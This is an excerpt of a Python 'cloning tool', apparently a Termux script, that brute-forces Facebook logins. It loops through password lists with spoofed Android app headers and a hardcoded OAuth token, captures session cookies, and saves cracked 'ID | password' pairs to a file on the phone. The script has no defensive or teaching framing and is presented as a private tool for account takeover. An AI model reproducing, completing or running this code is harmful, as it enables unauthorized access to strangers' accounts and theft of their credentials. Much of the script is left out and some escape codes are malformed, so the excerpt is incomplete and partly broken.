...
\__|     \__|      \__|\__|  \__|\__|  \__|
 ...
 ┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 ┃ [\033[1;91m✓\033[1;92m] CREATOR   \033[1;91m: \033[1;92mMark Sy / Verdida     
 ┃ [\033[1;91m✓\033[1;92m] TOOL      \033[1;91m: \033[1;92mCLONING TOOL             
 ┃ [\033[1;91m✓\033[1;92m] STATUS    \033[1;91m: \033[1;92mPRIVATE                       
 ┃ [\033[1;91m✓\033[1;92m] SYSTEM    \033[1;91m: \033[1;92MONLY DATA WORKING NOT TESTED TO WIFI               
 ┃ [\033[1;91m✓\033[1;92m] FACEBOOK  \033[1;91m: \033[1;92mhttps://www.facebook.com/m4rk.sy             
...
tokenku=[]
# LOGIN_KEY
correct_username = 'markxcrack'
key = 'true'

while key == 'true':
    username = input('\3[0;97m[•]\3[1;96m~~~~~>\3[1;92MKEY TO AVOID TO SELL THE TOOL \3[1;91m: ')

    if username == correct_username:
        print('\3[1;37m-----------------------------------------------\3[0;97m[•]\3[1;32m YOU HAVE BEEN APPROVED BY MARK')
        time.sleep(1)
...
def ffb(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write(f'\r\r\033[1;37m [M4RK] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
...
def api1(ids,names,passlist):
                try:
                        ...
                        for pw in passlist:
                                ...
                                if 'session_key' in q:
                                        print(f'\r\r\033[1;32m [M4RK-OK] '+ids+' | '+pas+'\033[1;97m')
                                        open(f'/sdcard/M4RK.txt','a').write(ids+'|'+pas+'\n')
                                        #cek_apk(session,coki)
                                        oks.append(ids)
                                        break
...
def rcrack_free(idf,pwv):
	...
	#		print(idf+'|'+ps)
			...
			if 'c_user' in log_cookies:
				...
				cid = coki[151:166]
				print('\n')
				print('\033[1;92m[M4RK-OK] '+idf+' | '+ps+'\033[0;97m')
				cek_apk(coki)
				...
				cid = coki[141:156]
				print('\n')
				print('\033[1;91m[M4RK-CP] '+idf+' | '+ps+'\033[0;97m')
                ...
                try:
                        ...
                        for pas in passlist:
                                ...
                                head = {
                                        ...
                                        'x-fb-connection-type':'unknown',
                                        'Authorization':'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                                        'User-Agent': 'DM4RKk/2.1.0 Linux; U; Android 6.0.0; GT-I9300I Build/KTU84P) [FBAN/FB4A;FBAV/540.0.0.84.626;FBBV/169717250;FBDM/{density=4.0,width=1532,height=2560};FBLC/en_US;FBCR/Grameenphone;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/GT-I9300I;FBSV/6.0.0;FBCA/armeabi-v7a:armeabi;]',
                                        'x-fb-net-hni':str(random.randint(2e4,4e4)),
                                        'x-fb-connection-bandwidth':str(random.randint(2e7,3e7)),
                                        'x-fb-connection-quality':'EXCELLENT',
                                        'x-fb-friendly-name':'authenticate',
